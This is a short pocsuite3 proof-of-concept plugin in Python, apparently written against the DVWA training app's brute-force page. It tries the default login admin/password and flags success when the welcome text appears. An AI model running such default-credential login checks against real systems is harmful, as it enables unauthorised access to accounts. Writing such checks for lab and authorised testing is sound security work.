# -*- coding: utf-8 -*-
from pocsuite3.api import Output, POCBase, register_poc, requests

class POC(POCBase):
    def _verify(self):
        result = {}
        if "/brute/" in self.url.lower():
            base = self.url.rstrip('/') + "/index.php"
            # 必须带上 Login 参数
            params = {'username': 'admin', 'password': 'password', 'Login': 'Login'}
            self.set_payload("admin/password")
            try:
                res = requests.get(base, params=params, timeout=5)
                if "Welcome to the password protected area admin" in res.text:
                    result['VerifyInfo'] = {"URL": base, "Account": "admin/password"}
            except: pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result: output.success(result)
        else: output.fail()
        return output

register_poc(POC)